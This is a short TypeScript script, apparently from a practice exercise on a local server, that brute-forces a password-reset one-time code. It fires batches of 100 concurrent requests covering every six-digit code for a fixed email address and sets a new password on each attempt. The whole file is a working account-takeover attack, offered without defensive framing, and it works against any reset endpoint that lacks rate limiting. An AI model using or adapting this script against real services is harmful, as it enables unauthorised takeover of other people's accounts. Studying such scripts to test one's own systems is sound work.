import axios from 'axios';

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "yash@gmail.com",
        "otp": otp,
        "newPassword": "123123123"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };

    await axios.request(config)
    .then((response) => {
        /* console.log(JSON.stringify(response.data)); */
    })
    .catch((error) => {
       /*  console.log(error); */
    });
    
}

async function main() {
    for (let i = 0; i < 1000000; i += 100){
        console.log(i);
        let p = [];
        for (let j = 0; j < 100; j++){
            p.push(sendRequest((i+j).toString()));    
        }
        await Promise.all(p);
    }
}
main();
